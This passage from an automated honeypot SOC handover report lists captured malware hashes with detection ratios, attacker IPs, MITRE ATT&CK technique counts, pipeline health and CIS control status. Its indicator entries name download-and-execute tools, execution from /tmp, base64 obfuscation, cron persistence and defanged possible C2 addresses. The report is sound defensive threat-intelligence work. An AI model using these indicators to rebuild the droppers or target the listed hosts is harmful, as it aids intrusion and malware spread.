| `b1633346a694467b99d9596fe36d0cc88ff1f82f8e86f1c53d3218de1839a43e` | Python Script | `b1633346a694467b...` | 60/100 | 🟡 MEDIUM | 0/76 ✅ |
| `b1e4374da060cb4bf9ff872f3e060486d9cd400519e0b2823f61670d64148ab4` | ELF Binary (Linux executable) (x86-64 64-bit) | `b1e4374da060cb4b...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `b20f39fc00d242e706b6c30367ad811c676e0575050a4ec2f30104b696944b49` | ELF Binary (Linux executable) (x86-64 64-bit) | `b20f39fc00d242e7...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `c8545034cd4fe71eeadb24dacddc5da95c4311c7112c299f1325801f3e06f928` | ELF Binary (Linux executable) (x86 32-bit) | `c8545034cd4fe71e...` | 85/100 | 🔴 HIGH | **39/74** 🔴 |
| `ce3cb467257e402122e4ab5f3f40fefcbdb4a662664659672a38967ee8aaaad0` | ELF Binary (Linux executable) (x86-64 64-bit) | `ce3cb467257e4021...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `d0f5cafd9fb6a363a8b97c84a3546f601a4ba10d49cdd7dae418288caec6940b` | ELF Binary (Linux executable) (x86 32-bit) | `d0f5cafd9fb6a363...` | 44/100 | 🟡 MEDIUM | **10/75** 🔴 |
| `d46555af1173d22f07c37ef9c1e0e74fd68db022f2b6fb3ab5388d2c5bc6a98e` | Bash Script | `d46555af1173d22f...` | 70/100 | 🔴 HIGH | **26/75** 🔴 |
| `dbb7ebb960dc0d5a480f97ddde3a227a2d83fcaca7d37ae672e6a0a6785631e9` | ELF Binary (Linux executable) (AArch64 64-bit) | `dbb7ebb960dc0d5a...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `ea73a088909b53110444807188562c406c6c6c89b3748aee016bc996ab1f1318` | Unknown binary | `ea73a088909b5311...` | 55/100 | 🟡 MEDIUM | **39/74** 🔴 |
| `eaf9adb4bb80316a3aafceabc0f2ed2aed7c76cf134b9b7c66226fc4f003aa97` | ELF Binary (Linux executable) (x86-64 64-bit) | `eaf9adb4bb80316a...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `f11dd1e4a3d27eef85d44154d662ce94234ee71b54468aeb2c23edb30b74a5c5` | ELF Binary (Linux executable) (x86-64 64-bit) | `f11dd1e4a3d27eef...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/73** 🔴 |
| `f772dbf0e0b8bc9e935686d287f63b6577a7a08110350b745ff8e066cb753b8b` | Unknown binary | `f772dbf0e0b8bc9e...` | 10/100 | 🟢 LOW | Not in VT |
| `tmp4vwws8i2` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmph0z5bqd1` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmpktf8uk4r` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmpn81tmdfj` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |

**Suspicious Indicators — HIGH Severity Samples:**

_`3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` (3ad48bae18b7ea8e7ffe3608...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` (725d1de20672ed85f32e823f...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`
- `IP:Port (possible C2)` — `51.158.248[.]122:8517`

_`88d028a54a136782982817d1d93c89b075b7f04897b0c0681311add7c8712eb6` (88d028a54a136782982817d1...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`c8545034cd4fe71eeadb24dacddc5da95c4311c7112c299f1325801f3e06f928` (c8545034cd4fe71eeadb24da...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`d46555af1173d22f07c37ef9c1e0e74fd68db022f2b6fb3ab5388d2c5bc6a98e` (d46555af1173d22f07c37ef9...)_
- `Execution from /tmp` — `/tmp/clean_crontab`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `129.153.145[.]135` | US | Oracle Corporation | **100** ⚠️ | 8 |
| `45.198.224[.]120` | NL | VPSVAULT.HOST LTD | **100** ⚠️ | 3 |
| `64.110.90[.]250` | KR | Oracle Corporation | **100** ⚠️ | 4 |
| `45.79.207[.]181` | US | Linode | **100** ⚠️ | 50 |
| `45.205.1[.]42` | BR | VPSVAULT.HOST LTD | **100** ⚠️ | 7 |
| `195.96.139[.]82` | GB | Driftnet Ltd | **100** ⚠️ | 7 |
| `176.65.139[.]99` | NL | Storm Industries LLC | **100** ⚠️ | 50 |
| `51.158.248[.]122` | NL | Scaleway - Amsterdam, Netherlands | **100** ⚠️ | 11 |
| `218.27.202[.]178` | CN | China Unicom Jilin province network | **100** ⚠️ | 26 |
| `194.165.16[.]164` | LT | Flyservers S.A. | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 312 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 297 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 6 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 5 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 5 |

---

## 🔕 False Positive Summary (12 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 2 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 10 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 604 cases |
| Tool 34  | Credential Extractor        | ✅ 309 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 7 fingerprints |
| Tool 36  | Command Clustering          | ✅ 7 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 35 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 12 filtered (2.0%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 23 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 47 files |
| Tool 33  | YARA Classifier             | ✅ 36 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 297 priority case(s) shown individually · 24 recon entry/entries in table (10 group(s) consolidating 281 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-06-25T18:14:14Z_
